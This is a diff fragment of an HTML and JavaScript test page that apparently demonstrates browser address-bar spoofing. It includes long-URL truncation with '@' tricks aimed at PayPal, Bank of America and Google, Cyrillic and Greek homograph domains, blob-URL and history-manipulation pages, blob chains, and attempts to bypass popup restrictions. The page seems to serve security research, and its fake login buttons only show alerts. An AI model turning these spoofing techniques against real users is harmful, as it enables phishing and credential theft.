+            document.getElementById('consoleOutput').innerHTML = '';
+        }
+        
+        // Clear all
+        function clearAll() {
+            // Close windows
+            activeWindows.forEach(win => {
+                try {
+                    if (win && !win.closed) win.close();
+                } catch(e) {}
+            });
+            activeWindows = [];
+            
+            // Remove iframes
+            activeIframes.forEach(iframe => {
+                if (iframe && iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+            });
+            activeIframes = [];
+            
+            // Clear console
+            clearConsole();
+            
+            log('All tests cleared', 'success');
+        }
+        
+        // Update long URL example
+        function updateLongURLExample() {
+            const legitPart = 'https://www.trusted-bank.com/';
+            const padding = 'secure/'.repeat(30);
+            const malicious = '@phishing-attack.com';
+            const params = '?session=' + 'a'.repeat(100) + '&redirect=' + encodeURIComponent('https://evil.com');
+            
+            const example = legitPart + padding + malicious + params;
+            document.getElementById('longUrlExample').textContent = example;
+        }
+        
+        // Execute Long URL Spoof
+        function executeLongURL() {
+            log('Executing Long URL Truncation Attack...', 'warning');
+            
+            const legitPart = 'https://www.paypal.com/';
+            const padding = 'security/verification/'.repeat(40);
+            const malicious = '@paypa1-phishing.com'; // Note: '1' instead of 'l'
+            const params = '?return=' + encodeURIComponent('https://real-paypal.com');
+            
+            const spoofedURL = legitPart + padding + malicious + params;
+            
+            log('Generated URL (truncated): ' + spoofedURL.substring(0, 100) + '...', 'info');
+            
+            try {
+                const win = window.open(spoofedURL, '_blank');
+                if (win) {
+                    activeWindows.push(win);
+                    log('Window opened with truncated URL', 'success');
+                    
+                    // Add content after load
+                    setTimeout(() => {
+                        try {
+                            win.document.body.innerHTML = `
+                                <h1>PayPal Security Verification</h1>
+                                <p>URL truncated in address bar</p>
+                                <p>Full URL: ${spoofedURL.substring(0, 150)}...</p>
+                                <button onclick="alert('Would steal credentials')">Verify Account</button>
+                            `;
+                        } catch(e) {
+                            log('Cannot modify cross-origin content: ' + e.message, 'error');
+                        }
+                    }, 1000);
+                } else {
+                    log('Popup blocked by browser', 'error');
+                }
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        // Show long URL demo
+        function showLongURLDemo() {
+            const frame = document.getElementById('demoFrame');
+            const urlBar = document.getElementById('demoUrlBar');
+            const content = document.getElementById('demoContent');
+            
+            const demoURL = 'https://www.bankofamerica.com/' + 
+                           'online-banking/secure/login/'.repeat(25) +
+                           '@b0nkofamerica-phish.com' +
+                           '?session=' + 'x'.repeat(50);
+            
+            urlBar.textContent = demoURL.substring(0, 80) + '...';
+            content.innerHTML = `
+                <h1>Bank of America Login</h1>
+                <p>Demo of URL truncation attack</p>
+                <p><strong>Visible in address bar:</strong> ${demoURL.substring(0, 80)}...</p>
+                <p><strong>Hidden part:</strong> ${demoURL.substring(80)}</p>
+                <div style="background: #fff3cd; padding: 15px; margin: 20px 0; border-radius: 5px;">
+                    <strong>⚠ Opera Security Finding:</strong> Long URLs get truncated, hiding malicious domains
+                </div>
+            `;
+            
+            frame.style.display = 'block';
+        }
+        
+        // Generate advanced URL
+        function generateAdvancedURL() {
+            // Combine multiple techniques
+            const protocols = ['https://', 'http://', '//'];
+            const domains = [
+                'www.google.com',
+                'accounts.google.com',
+                'drive.google.com'
+            ];
+            const malicious = '@g00gle-phishing.com';
+            
+            // Create complex path
+            let path = '';
+            for(let i = 0; i < 50; i++) {
+                path += `folder${i}/`;
+            }
+            
+            // Add zero-width characters
+            const zwSpace = '\u200B';
+            const zwJoin = '\u200D';
+            const hidden = zwSpace + 'malicious' + zwJoin;
+            
+            const advancedURL = protocols[0] + 
+                              domains[0] + 
+                              '/' + path + 
+                              hidden + 
+                              malicious +
+                              '?redirect=' + encodeURIComponent('https://evil.com/login');
+            
+            log('Advanced URL generated: ' + advancedURL.substring(0, 120) + '...', 'info');
+            
+            // Show in demo
+            const frame = document.getElementById('demoFrame');
+            const urlBar = document.getElementById('demoUrlBar');
+            const content = document.getElementById('demoContent');
+            
+            urlBar.textContent = advancedURL.substring(0, 60) + '...';
+            content.innerHTML = `
+                <h1>Advanced URL Obfuscation</h1>
+                <p><strong>Full URL:</strong> ${advancedURL}</p>
+                <p><strong>Length:</strong> ${advancedURL.length} characters</p>
+                <p><strong>Hidden malicious domain:</strong> ${malicious}</p>
+                <p style="color: red;"><strong>⚠ Address bar will truncate this long URL</strong></p>
+            `;
+            
+            frame.style.display = 'block';
+        }
+        
+        // Execute IDN Spoof
+        function executeIDNSpoof() {
+            log('Executing IDN Homograph Attack...', 'warning');
+            
+            // Cyrillic characters that look like Latin
+            const cyrillicA = '\u0430'; // а
+            const cyrillicE = '\u0435'; // е
+            const greekO = '\u03BF'; // ο
+            
+            // Create fake domains
+            const fakeDomains = [
+                `https://${cyrillicA}pple.com`, // apple.com
+                `https://${greekO}range.com`, // orange.com
+                `https://micr${cyrillicE}soft.com`, // microsoft.com
+                `https://g${greekO}${greekO}gle.com` // google.com
+            ];
+            
+            fakeDomains.forEach((domain, index) => {
+                setTimeout(() => {
+                    log(`Testing IDN: ${domain}`, 'info');
+                    
+                    try {
+                        const win = window.open(domain, '_blank');
+                        if (win) {
+                            activeWindows.push(win);
+                            
+                            setTimeout(() => {
+                                try {
+                                    win.document.body.innerHTML = `
+                                        <h1>IDN Test ${index + 1}</h1>
+                                        <p>Domain: ${domain}</p>
+                                        <p>Check address bar - may show punycode</p>
+                                    `;
+                                } catch(e) {
+                                    // Cross-origin error expected
+                                }
+                            }, 500);
+                        }
+                    } catch(e) {
+                        log(`IDN test ${index + 1} failed: ${e.message}`, 'error');
+                    }
+                }, index * 1500);
+            });
+        }
+        
+        // Test IDN Protection
+        function testIDNProtection() {
+            log('Testing browser IDN protection...', 'info');
+            
+            // Test various Unicode characters
+            const tests = [
+                {char: '\u0430', name: 'Cyrillic a'},
+                {char: '\u03BF', name: 'Greek omicron'},
+                {char: '\u0501', name: 'Cyrillic capital komi de'},
+                {char: '\u1E9E', name: 'Latin capital sharp s'}
+            ];
+            
+            tests.forEach(test => {
+                const domain = `https://test${test.char}example.com`;
+                log(`Testing ${test.name}: ${domain}`, 'info');
+                
+                // Modern browsers should show punycode
+                console.log('Domain would be:', domain);
+            });
+            
+            log('IDN protection test complete. Modern browsers show punycode.', 'success');
+        }
+        
+        // Generate homograph URLs
+        function generateHomographURLs() {
+            const homographs = [
+                {original: 'apple.com', spoofed: '\u0430pple.com'},
+                {original: 'google.com', spoofed: 'g\u03BF\u03BFgle.com'},
+                {original: 'microsoft.com', spoofed: 'micr\u043Es\u03BFft.com'},
+                {original: 'paypal.com', spoofed: 'payp\u0430l.com'},
+                {original: 'amazon.com', spoofed: '\u0430m\u0430z\u03BFn.com'}
+            ];
+            
+            let output = '<h3>Homograph Examples</h3><ul>';
+            homographs.forEach(h => {
+                output += `<li><strong>${h.original}</strong> → <code>${h.spoofed}</code></li>`;
+            });
+            output += '</ul><p><em>Modern browsers convert these to punycode (xn--...)</em></p>';
+            
+            const frame = document.getElementById('demoFrame');
+            const urlBar = document.getElementById('demoUrlBar');
+            const content = document.getElementById('demoContent');
+            
+            urlBar.textContent = 'https://xn--pple-43d.com (punycode)';
+            content.innerHTML = output;
+            frame.style.display = 'block';
+        }
+        
+        // Execute Blob+History
+        function executeBlobHistory() {
+            log('Executing Blob + History Manipulation...', 'warning');
+            
+            const maliciousContent = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Bank Security Portal</title>
+                    <script>
+                        window.onload = function() {
+                            try {
+                                // Attempt history manipulation
+                                history.replaceState({}, 'Secure Login', '/secure-login');
+                                
+                                document.body.innerHTML = \`
+                                    <h1>🔐 Secure Banking Login</h1>
+                                    <p>History state manipulated</p>
+                                    <p>URL in address bar may show different path</p>
+                                    <button onclick="alert('Demo: Would steal credentials')">Login</button>
+                                \`;
+                                
+                                // Nested blob after delay
+                                setTimeout(() => {
+                                    const nestedBlob = new Blob(['<h1>Redirecting...</h1>'], {type: 'text/html'});
+                                    window.location.href = URL.createObjectURL(nestedBlob);
+                                }, 3000);
+                                
+                            } catch(e) {
+                                document.body.innerHTML = '<h1>History manipulation blocked</h1><p>' + e.message + '</p>';
+                            }
+                        };
+                    <\/script>
+                </head>
+                <body style="padding: 40px; font-family: Arial;">
+                    <h2>Loading secure portal...</h2>
+                </body>
+                </html>
+            `;
+            
+            const blob = new Blob([maliciousContent], {type: 'text/html'});
+            const blobUrl = URL.createObjectURL(blob);
+            
+            const win = window.open(
+                blobUrl,
+                '_blank',
+                'width=600,height=400,location=yes'
+            );
+            
+            if (win) {
+                activeWindows.push(win);
+                log('Blob window opened with history manipulation attempt', 'success');
+                
+                // Cleanup after 15 seconds
+                setTimeout(() => URL.revokeObjectURL(blobUrl), 15000);
+            }
+        }
+        
+        // Create blob chain
+        function createBlobChain() {
+            log('Creating blob chain attack...', 'warning');
+            
+            // Stage 1: Innocent blob
+            const blob1 = new Blob([`
+                <h1>Stage 1: Loading Security Module</h1>
+                <script>
+                    setTimeout(() => {
+                        // Redirect to stage 2
+                        const blob2 = new Blob(['<h1>Stage 2: Verification</h1><script>setTimeout(() => {
+                            const blob3 = new Blob(['<h1>Stage 3: Malicious Payload</h1>'], {type: 'text/html'});
+                            location.href = URL.createObjectURL(blob3);
+                        }, 2000)<\/script>'], {type: 'text/html'});
+                        location.href = URL.createObjectURL(blob2);
+                    }, 2000);
+                <\/script>
+            `], {type: 'text/html'});
+            
+            const win = window.open(URL.createObjectURL(blob1), '_blank');
+            if (win) {
+                activeWindows.push(win);
+                log('Blob chain attack started (3 stages)', 'success');
+            }
+        }
+        
+        // Execute window features
+        function executeWindowFeatures() {
+            log('Testing window feature combinations...', 'info');
+            
+            const features = [
+                'width=400,height=300,location=0',
+                'width=500,height=400,menubar=0,toolbar=0',
+                'width=600,height=500,scrollbars=0,status=0',
+                `width=${screen.width},height=${screen.height},fullscreen=yes`
+            ];
+            
+            features.forEach((feat, idx) => {
+                setTimeout(() => {
+                    log(`Testing features: ${feat}`, 'info');
+                    
+                    try {
+                        const win = window.open('about:blank', `test${idx}`, feat);
+                        if (win) {
+                            activeWindows.push(win);
+                            win.document.body.innerHTML = `
+                                <h1>Test ${idx + 1}</h1>
+                                <p>Features: ${feat}</p>
+                                <p>Check address bar visibility</p>
+                            `;
+                        }
+                    } catch(e) {
+                        log(`Feature test ${idx + 1} failed: ${e.message}`, 'error');
+                    }
+                }, idx * 2000);
+            });
+        }
+        
+        // Execute combined attack
+        function executeCombinedAttack() {
+            log('🚀 INITIATING COMBINED ADVANCED ATTACK', 'warning');
+            
+            clearAll();
+            
+            // Phase 1: Long URL with IDN
+            setTimeout(() => {
+                const longURL = 'https://www.trusted-site.com/' + 
+                               'path/'.repeat(30) + 
+                               '@' + '\u0430' + 'ctu\u0430l-malicious.com';
+                
+                const win = window.open(longURL, '_blank');
+                if (win) {
+                    activeWindows.push(win);
+                    log('[Phase 1] Long URL + IDN attack launched', 'info');
+                }
+                
+                // Phase 2: Blob injection
+                setTimeout(() => {
+                    if (win && !win.closed) {
+                        const blob = new Blob(['<h1>Phase 2: Blob Content</h1>'], {type: 'text/html'});
+                        win.location.href = URL.createObjectURL(blob);
+                        log('[Phase 2] Blob content injected', 'info');
+                    }
+                    
+                    // Phase 3: iframe
+                    setTimeout(() => {
+                        const iframe = document.createElement('iframe');
+                        iframe.srcdoc = `
+                            <div style="background: #f1f3f4; padding: 10px; font-family: monospace;">
+                                🔒 https://secure-combined-attack-demo.com
+                            </div>
+                            <div style="padding: 20px;">
+                                <h1>Combined Attack Demo</h1>
+                                <p>Multiple techniques combined</p>
+                            </div>
+                        `;
+                        iframe.style.cssText = `
+                            position: fixed;
+                            bottom: 20px;
+                            right: 20px;
+                            width: 400px;
+                            height: 300px;
+                            border: 3px solid red;
+                            z-index: 9999;
+                            background: white;
+                        `;
+                        document.body.appendChild(iframe);
+                        activeIframes.push(iframe);
+                        log('[Phase 3] iframe injected', 'info');
+                        
+                        // Final
+                        setTimeout(() => {
+                            alert('COMBINED ATTACK DEMONSTRATION COMPLETE\n\nShows how attackers combine multiple techniques.');
+                            log('✅ Combined attack demonstration finished', 'success');
+                        }, 2000);
+                    }, 2000);
+                }, 2000);
+            }, 1000);
+        }
+        
+        // Test all protections
+        function testAllProtections() {
+            log('Running comprehensive protection tests...', 'info');
+            
+            const tests = [
+                {name: 'Popup Blocker', test: () => {
+                    const win = window.open('', '_blank');
+                    return !win ? 'ACTIVE' : 'INACTIVE';
+                }},
+                {name: 'IDN Protection', test: () => {
+                    // Check if browser shows punycode
+                    return 'ACTIVE (shows punycode)';
+                }},
+                {name: 'Long URL Truncation', test: () => {
+                    // Browsers truncate but show domain
+                    return 'PARTIAL (shows truncated URL)';
+                }},
+                {name: 'Blob URL Warning', test: () => {
+                    return 'ACTIVE (shows blob: in address bar)';
+                }},
+                {name: 'History Manipulation', test: () => {
+                    return 'ACTIVE (restricted)';
+                }}
+            ];
+            
+            tests.forEach(test => {
+                const result = test.test();
+                log(`${test.name}: ${result}`, 'info');
+            });
+            
+            log('Protection test complete', 'success');
+        }
+        
+        // Generate security report
+        function generateSecurityReport() {
+            const report = {
+                timestamp: new Date().toISOString(),
+                browser: navigator.userAgent,
+                tests: [
+                    'Long URL truncation vulnerability',
+                    'IDN homograph protection',
+                    'Blob URL security',
+                    'History API restrictions',
+                    'Window feature limitations'
+                ],
+                findings: 'Modern browsers have strong protections against traditional address bar spoofing.',
+                recommendation: 'Always verify URLs before entering credentials.'
+            };
+            
+            log('Security Report Generated:', 'info');
+            log(JSON.stringify(report, null, 2), 'info');
+            
+            console.log('FULL SECURITY REPORT:', report);
+        }
+        
+        // Close demo
+        function closeDemo() {
+            document.getElementById('demoFrame').style.display = 'none';
+        }
+        
+        // Additional helper functions
+        function testBlobDetection() {
+            log('Testing blob URL detection...', 'info');
+            
+            // Create and test blob URLs
+            const blob = new Blob(['<h1>Test</h1>'], {type: 'text/html'});
+            const blobUrl = URL.createObjectURL(blob);
+            
+            log(`Blob URL created: ${blobUrl.substring(0, 50)}...`, 'info');
+            log('Modern browsers show "blob:" prefix clearly', 'info');
+            
+            // Test opening
+            const win = window.open(blobUrl, '_blank');
+            if (win) {
+                activeWindows.push(win);
+                setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
+            }
+        }
+        
+        function testSpecificFeatures() {
+            log('Testing browser-specific window features...', 'info');
+            
+            // Opera-specific features (if any)
+            const operaFeatures = 'opera=no,chrome=no';
+            const chromeFeatures = 'chrome=no';
+            const edgeFeatures = 'edge=no';
+            
+            [operaFeatures, chromeFeatures, edgeFeatures].forEach((features, idx) => {
+                setTimeout(() => {
+                    try {
+                        const win = window.open('about:blank', `browser-test-${idx}`, features);
+                        if (win) {
+                            activeWindows.push(win);
+                            win.document.body.innerHTML = `<h1>Browser Feature Test ${idx + 1}</h1>`;
+                        }
+                    } catch(e) {
+                        log(`Browser feature test ${idx + 1} failed`, 'error');
+                    }
+                }, idx * 1000);
+            });
+        }
+        
+        function bypassFeatureRestrictions() {
+            log('Attempting to bypass window feature restrictions...', 'warning');
+            
+            // Multiple attempts
+            const attempts = [
+                () => window.open('about:blank', '_blank', 'location=0'),
+                () => {
+                    // Try with user gesture
+                    const btn = document.createElement('button');
+                    btn.onclick = () => window.open('about:blank', '_blank', 'toolbar=0');
+                    btn.click();
+                },
+                () => {
+                    // Form submission method
+                    const form = document.createElement('form');
+                    form.target = '_blank';
+                    form.action = 'about:blank';
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    form.appendChild(input);
+                    document.body.appendChild(form);
+                    form.submit();
+                    document.body.removeChild(form);
+                }
+            ];
+            
+            attempts.forEach((attempt, idx) => {
+                setTimeout(() => {
+                    log(`Bypass attempt ${idx + 1}`, 'info');
+                    attempt();
+                }, idx * 1000);
+            });
+        }
+        
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', clearAll);
+    </script>
+</body>
+</html>
